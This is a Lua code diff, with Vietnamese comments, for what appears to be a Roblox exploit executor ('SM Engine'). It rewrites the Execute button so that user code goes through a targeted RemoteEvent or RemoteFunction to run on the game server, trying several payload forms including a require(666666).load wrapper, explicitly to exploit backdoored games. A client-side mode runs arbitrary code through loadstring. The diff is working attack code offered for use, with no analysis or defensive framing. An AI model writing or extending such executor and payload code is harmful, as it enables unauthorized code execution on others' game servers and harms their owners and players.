@@ -563,34 +563,88 @@ obj28.MouseButton1Click:Connect(function()
     notify("System", "Backdoor cache cleared.", Colors.Info)
 end)
 
--- Nút Execute (obj26) - PRO Logic
+-- ==========================================
+-- BẢN FIX CUỐI CÙNG CHO NÚT EXECUTE (obj26)
+-- ==========================================
 obj26.MouseButton1Click:Connect(function()
-    local code = obj32.Text
-    if code == "" then return end
-
-    if EngineState.SSMode and EngineState.TargetRemote then
-        -- Kỹ thuật tàng hình gửi code qua Remote
-        local wrappedCode = "spawn(function() " .. code .. " end)"
-        pcall(function()
-            if EngineState.TargetRemote:IsA("RemoteEvent") then
-                EngineState.TargetRemote:FireServer(wrappedCode)
+    -- 1. Định nghĩa hàm log nội bộ để tránh lỗi NIL dòng 581
+    local function safeLog(text, color)
+        -- Thử gọi hàm log toàn cục, nếu nil thì dùng warn/print thay thế
+        local success = pcall(function()
+            if logMessage then 
+                logMessage(text, color) 
             else
-                EngineState.TargetRemote:InvokeServer(wrappedCode)
+                warn("[SM Engine]: " .. text)
             end
         end)
+        if not success then print("[SM Log]: " .. text) end
+    end
+
+    -- 2. Kiểm tra đầu vào (obj32 là TextBox của bạn)
+    if not obj32 or obj32.Text == "" then 
+        safeLog("TextBox trống hoặc không tìm thấy!", Colors.Error)
+        return 
+    end
+
+    local inputSource = obj32.Text
+    local remote = EngineState.TargetRemote
+
+    -- 3. LOGIC THỰC THI
+    if EngineState.SSMode and remote then
+        -- Chế độ Server-Side (SS)
+        safeLog("Injecting SS Payloads...", Colors.Warning)
+        
+        -- Làm sạch code để tránh lỗi ngoặc kép khi dùng require
+        local _, cleanCode = pcall(function() 
+            return inputSource:gsub('"', '\\"') 
+        end)
+        cleanCode = cleanCode or inputSource
+
+        -- Các kiểu Payload để bypass backdoor (như LALOL Hub)
+        local payloads = {
+            inputSource, 
+            "spawn(function() " .. inputSource .. " end)",
+            [[require(666666).load("]] .. cleanCode .. [[")]], -- Kiểu require phổ biến
+            {["script"] = inputSource, ["type"] = "execute"}  -- Kiểu table nâng cao
+        }
+
+        task.spawn(function()
+            local anySuccess = false
+            for i, p in ipairs(payloads) do
+                local s, _ = pcall(function()
+                    if remote:IsA("RemoteEvent") then
+                        remote:FireServer(p)
+                    else
+                        remote:InvokeServer(p)
+                    end
+                end)
+                if s then anySuccess = true end
+            end
+            
+            if anySuccess then 
+                safeLog("SS Sent! Kiểm tra F9 > Server.", Colors.Success)
+            else
+                safeLog("SS Failed: Remote từ chối payload.", Colors.Error)
+            end
+        end)
+
     else
-        -- Chạy Client-Side bình thường
-        local load = loadstring or getgenv().loadstring
-        if load then
-            local f, err = load(code)
+        -- Chế độ Client-Side (Local)
+        local run = loadstring or getgenv().loadstring
+        if run then
+            local f, err = run(inputSource)
             if f then 
-                local success, runtimeErr = pcall(f) 
-                if not success then notify("Error", runtimeErr, Colors.Error) end
+                local s, rErr = pcall(f)
+                if not s then 
+                    safeLog("Runtime Error: " .. tostring(rErr), Colors.Error) 
+                else
+                    safeLog("Local Executed.", Colors.Success)
+                end
             else 
-                notify("Syntax", err, Colors.Error) 
+                safeLog("Syntax Error: " .. tostring(err), Colors.Error) 
             end
         else
-            notify("System", "Executor không hỗ trợ loadstring.", Colors.Error)
+            safeLog("Executor không hỗ trợ loadstring!", Colors.Error)
         end
     end
 end)
